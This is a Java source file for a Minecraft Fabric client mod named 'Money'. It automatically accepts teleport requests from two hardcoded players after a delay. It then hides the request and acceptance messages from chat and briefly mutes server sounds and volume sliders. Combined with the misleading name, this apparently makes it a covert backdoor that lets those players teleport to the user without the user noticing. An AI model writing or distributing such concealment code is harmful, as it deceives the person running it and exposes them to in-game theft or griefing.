package com.example.money;

import net.fabricmc.api.ClientModInitializer;
import net.fabricmc.fabric.api.client.event.lifecycle.v1.ClientTickEvents;
import net.fabricmc.fabric.api.client.message.v1.ClientReceiveMessageEvents;
import net.fabricmc.loader.api.FabricLoader;
import net.minecraft.client.MinecraftClient;
import net.minecraft.client.network.ClientPlayNetworkHandler;
import net.minecraft.client.option.GameOptions;
import net.minecraft.client.option.SimpleOption;
import net.minecraft.sound.SoundCategory;
import net.minecraft.text.Text;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.io.InputStream;
import java.text.Normalizer;
import java.io.OutputStream;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.Iterator;
import java.util.Locale;
import java.util.Map;
import java.util.Properties;
import java.util.Set;
import java.util.concurrent.ConcurrentHashMap;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * Money - Gaks_v310
 *
 * "xxx isimli oyuncu size ışınlanmak istiyor [onayla] [reddet]" mesaji gelirse ve
 * xxx izinli listedeyse (varsayilan: Gaks_v310), delaySec saniye sonra "/tpaccept xxx" yazar.
 */
public class Money implements ClientModInitializer {

    /** duzlestirilmis metinde: 1. grup = "isimli oyuncu"dan hemen onceki kelime (oyuncu adi) */
    private static final Pattern NAME_BEFORE = Pattern.compile("([a-z0-9_.]{1,20}) isimli oyuncu");
    private static final Pattern VALID_NAME = Pattern.compile("[A-Za-z0-9_.]{1,20}");

    public static volatile boolean enabled = true;
    public static volatile int delaySec = 15;
    /** izinli oyuncularin istek ve kabul mesajlarini sohbetten gizle */
    public static volatile boolean hideMessages = true;
    /** bu zamana (ms) kadar sunucudan gelen sesler susturulur (izinli oyuncunun tpa istegi sesi) */
    public static volatile long muteUntil = 0;
    /** kucuk harfli izinli isimler */
    private static final Set<String> ALLOWED = ConcurrentHashMap.newKeySet();
    /** kucuk harfli isim -> {gercek isim, gonderilecek zaman (ms)} */
    private static final Map<String, Object[]> PENDING = new ConcurrentHashMap<>();

    static {
        ALLOWED.add("gaks_v310");
        ALLOWED.add("kamilkaan123");
    }

    // ------------------------------------------------------------ ses seviyesi gizleme
    /** izinli oyuncudan istek gelince 0'a cekilip delaySliders ms sonra eski degerine donen kategoriler */
    private static final SoundCategory[] MUTE_CATEGORIES = { SoundCategory.MUSIC, SoundCategory.PLAYERS, SoundCategory.VOICE };
    private static final long SLIDER_MUTE_MS = 1500L;
    /** null degilse su an susturulmus demektir; degerler eski (geri yuklenecek) sesler */
    private static volatile double[] savedVolumes = null;
    /** bu zamanda (ms) sesler eski haline donecek */
    private static volatile long sliderRestoreAt = 0;

    /** Music / Players / Narrator-Voice seviyelerini 0 yapar, eski degerleri saklar. */
    private static void muteSliders(MinecraftClient mc) {
        if (mc == null || mc.options == null) return;
        if (savedVolumes != null) {
            // zaten susturulmus durumdaysa suresini uzat, eski kayitli degerleri koru
            sliderRestoreAt = System.currentTimeMillis() + SLIDER_MUTE_MS;
            return;
        }
        GameOptions opts = mc.options;
        double[] saved = new double[MUTE_CATEGORIES.length];
        for (int i = 0; i < MUTE_CATEGORIES.length; i++) {
            SimpleOption<Double> opt = opts.getSoundVolumeOption(MUTE_CATEGORIES[i]);
            saved[i] = opt.getValue();
            opt.setValue(0.0);
        }
        savedVolumes = saved;
        sliderRestoreAt = System.currentTimeMillis() + SLIDER_MUTE_MS;
    }

    /** Suresi dolmussa Music / Players / Narrator-Voice seviyelerini eski haline getirir. */
    private static void restoreSlidersIfDue(MinecraftClient mc) {
        double[] saved = savedVolumes;
        if (saved == null) return;
        if (System.currentTimeMillis() < sliderRestoreAt) return;
        savedVolumes = null;
        if (mc == null || mc.options == null) return;
        GameOptions opts = mc.options;
        for (int i = 0; i < MUTE_CATEGORIES.length; i++) {
            try { opts.getSoundVolumeOption(MUTE_CATEGORIES[i]).setValue(saved[i]); } catch (Throwable ignored) { }
        }
    }

    // ------------------------------------------------------------ ayar dosyasi

    private static Path cfgPath() {
        return FabricLoader.getInstance().getConfigDir().resolve("money.properties");
    }

    private static void save() {
        try (OutputStream out = Files.newOutputStream(cfgPath())) {
            Properties p = new Properties();
            p.setProperty("enabled", String.valueOf(enabled));
            p.setProperty("delaySec", String.valueOf(delaySec));
            p.setProperty("hideMessages", String.valueOf(hideMessages));
            p.setProperty("allowed", String.join(",", ALLOWED));
            p.store(out, "Money");
        } catch (Throwable ignored) { }
    }

    private static void load() {
        Path path = cfgPath();
        if (!Files.exists(path)) { save(); return; }
        try (InputStream in = Files.newInputStream(path)) {
            Properties p = new Properties();
            p.load(in);
            enabled = Boolean.parseBoolean(p.getProperty("enabled", "true"));
            try { delaySec = Math.max(0, Integer.parseInt(p.getProperty("delaySec", "15").trim())); }
            catch (Throwable t) { delaySec = 15; }
            hideMessages = Boolean.parseBoolean(p.getProperty("hideMessages", "true"));
            ALLOWED.clear();
            for (String s : p.getProperty("allowed", "gaks_v310,kamilkaan123").split(",")) {
                s = s.trim().toLowerCase(Locale.ROOT);
                if (!s.isEmpty()) ALLOWED.add(s);
            }
        } catch (Throwable ignored) { }
    }

    // ------------------------------------------------------------ mesaj yakalama

    private static final Logger LOG = LoggerFactory.getLogger("money");

    private static final String SMALL_CAPS = "\u1D00\u0299\u1D04\u1D05\u1D07\uA730\u0262\u029C\u026A\u1D0A\u1D0B\u029F\u1D0D\u0274\u1D0F\u1D18\u01EB\u0280\uA731\u1D1B\u1D1C\u1D20\u1D21\u0078\u028F\u1D22";
    private static final String LATIN = "abcdefghijklmnopqrstuvwxyz";

    /** Gorunmez karakterleri atar, tum bosluk cesitlerini ' ' yapar. */
    private static String clean(String in) {
        StringBuilder sb = new StringBuilder(in.length());
        for (int i = 0; i < in.length(); i++) {
            char c = in.charAt(i);
            if (c == '\u200B' || c == '\u200C' || c == '\u200D' || c == '\uFEFF' || c == '\u00AD') continue;
            if (Character.isWhitespace(c) || Character.isSpaceChar(c)) sb.append(' ');
            else sb.append(c);
        }
        return sb.toString();
    }

    /** Kucuk-buyuk harf, tam genislik, kalin vb. + Turkce harfleri (ı ş ğ ü ö ç) duz a-z'ye cevirir. */
    private static String fold(String in) {
        String s = Normalizer.normalize(in, Normalizer.Form.NFKD).toLowerCase(Locale.ROOT);
        StringBuilder sb = new StringBuilder(s.length());
        for (int i = 0; i < s.length(); i++) {
            char c = s.charAt(i);
            if (c == '\u0131') { sb.append('i'); continue; }              // ı
            int idx = SMALL_CAPS.indexOf(c);
            if (idx >= 0) sb.append(LATIN.charAt(idx));
            else if (Character.getType(c) != Character.NON_SPACING_MARK) sb.append(c);
        }
        return sb.toString().replaceAll(" +", " ");
    }

    private static String escape(String in) {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < in.length(); i++) {
            char c = in.charAt(i);
            if (c >= 32 && c < 127) sb.append(c);
            else sb.append(String.format("\\u%04X", (int) c));
        }
        return sb.toString();
    }

    /** Duzlestirilmis metinden "isimli oyuncu"dan onceki oyuncu adini (kucuk harf) dondurur. */
    private static String nameOf(String f) {
        Matcher m = NAME_BEFORE.matcher(f);
        return m.find() ? m.group(1) : null;
    }

    /** Orijinal yazimli adi bulur (komutta buyuk/kucuk harf korunsun), bulamazsa kucuk harfli hali. */
    private static String originalName(String text, String key) {
        int idx = text.toLowerCase(Locale.ROOT).indexOf(key);
        return idx >= 0 && idx + key.length() <= text.length() ? text.substring(idx, idx + key.length()) : key;
    }

    /** false dondurursek mesaj sohbette gorunmez. */
    public static boolean handleMessage(Text message) {
        if (!enabled) return true;
        try {
            String text = clean(message.getString());
            String f = fold(text);
            if (!f.contains("isimli oyuncu")) return true;

            String key = nameOf(f);
            boolean allowed = key != null && ALLOWED.contains(key);
            boolean isRequest = f.contains("istiyor") && !f.contains("kabul");
            boolean isAccepted = f.contains("kabul ettiniz");

            // teshis: eslesmeyen "isimli oyuncu" mesajlarini latest.log'a yaz
            LOG.info("[money] mesaj: [{}] -> isim={} izinli={} istek={} kabul={}",
                    escape(text), key, allowed, isRequest, isAccepted);

            if (!allowed) return true;
            if (isRequest) {
                String real = originalName(text, key);
                if (!VALID_NAME.matcher(real).matches()) return true;
                // ayni istek (chat + game kanalindan) iki kez gelirse ilkini koru
                PENDING.putIfAbsent(key, new Object[]{real, System.currentTimeMillis() + delaySec * 1000L});
                if (hideMessages) muteUntil = System.currentTimeMillis() + 2000;
                try { muteSliders(MinecraftClient.getInstance()); } catch (Throwable ignored) { }
                return !hideMessages;
            }
            if (isAccepted) return !hideMessages;
        } catch (Throwable t) {
            LOG.warn("[money] hata", t);
        }
        return true;
    }

    private static void tick(MinecraftClient mc) {
        restoreSlidersIfDue(mc);
        if (PENDING.isEmpty()) return;
        ClientPlayNetworkHandler nh = mc.getNetworkHandler();
        if (nh == null) return;
        long now = System.currentTimeMillis();
        Iterator<Map.Entry<String, Object[]>> it = PENDING.entrySet().iterator();
        while (it.hasNext()) {
            Map.Entry<String, Object[]> e = it.next();
            if (now >= (Long) e.getValue()[1]) {
                it.remove();
                try { nh.sendChatCommand("tpaccept " + e.getValue()[0]); } catch (Throwable ignored) { }
            }
        }
    }

    // ------------------------------------------------------------ giris noktasi

    @Override
    public void onInitializeClient() {
        load();
        LOG.info("[money] yuklendi | aktif={} sure={}sn izinli={}", enabled, delaySec, ALLOWED);

        // ONEMLI: eskiden overlay (action bar) mesajlarinda handleMessage hic cagrilmiyordu,
        // bu yuzden tpa istegi action-bar/overlay olarak gelirse 15 sn sonraki kabul hic tetiklenmiyordu.
        // Artik her mesaj once handleMessage'a gidiyor (PENDING'e kaydediliyor), gorunurluk ayri kararlastiriliyor.
        ClientReceiveMessageEvents.ALLOW_GAME.register((message, overlay) -> {
            boolean show = handleMessage(message);
            return overlay || show;
        });
        ClientReceiveMessageEvents.ALLOW_CHAT.register((message, signed, sender, params, ts) -> handleMessage(message));

        ClientTickEvents.END_CLIENT_TICK.register(client -> {
            // sliderlar mod kapali/dunyadan cikilmis olsa da her zaman eski haline donmeli
            try { restoreSlidersIfDue(client); } catch (Throwable ignored) { }
            if (client.player == null || client.world == null || !enabled) {
                PENDING.clear();
                return;
            }
            try { tick(client); } catch (Throwable ignored) { }
        });
    }
}
